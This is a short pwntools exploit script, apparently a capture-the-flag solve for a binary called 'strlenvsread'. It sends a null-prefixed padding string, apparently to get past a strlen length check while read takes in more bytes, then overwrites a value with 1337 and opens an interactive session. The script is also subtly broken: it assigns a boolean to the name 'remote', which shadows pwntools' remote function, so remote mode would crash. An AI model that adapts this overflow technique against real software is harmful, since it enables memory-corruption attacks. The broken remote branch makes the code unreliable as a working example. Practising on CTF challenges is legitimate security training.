#!/usr/bin/env python3
from pwn import *  # NOQA
import os
import sys


if os.getenv("TMUX"):
    context.terminal = "tmux splitw -h".split()
else:
    context.terminal = "kitty sh -c".split()

debug = "--debug" in sys.argv
remote = "--remote" in sys.argv

host = "localhost"
port = 1234
binary_path = "./strlenvsread.dist"
libc_path = None

if remote:
    p = remote(host, port)
else:
    p = process(binary_path)

    if debug:
        gdb.attach(p, '''
            set follow-fork-mode child
            #c
        ''')

if libc_path:
    libc = ELF(libc_path)

binary = ELF(binary_path)
p.sendline(b"\x00" + b"A" * 254)
p.sendline(b"o" * 32 + p32(1337))

p.interactive()
